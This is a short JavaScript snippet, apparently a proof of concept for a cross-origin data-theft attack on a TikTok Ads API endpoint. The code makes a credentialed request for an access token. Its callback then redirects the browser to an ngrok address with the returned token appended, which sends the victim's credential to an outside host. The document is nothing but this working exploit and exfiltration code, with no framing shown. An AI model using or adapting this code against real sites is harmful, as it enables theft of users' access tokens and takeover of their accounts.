var xhr = new XMLHttpRequest();

xhr.onload = reqListener; 
xhr.open("GET", "https://ads.tiktok.com/api/v1/self-serve/athena/access_token/");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send();

function reqListener() {
    location='//dc1b-202-162-37-174.ngrok-free.app//?key='+this.responseText; 
};
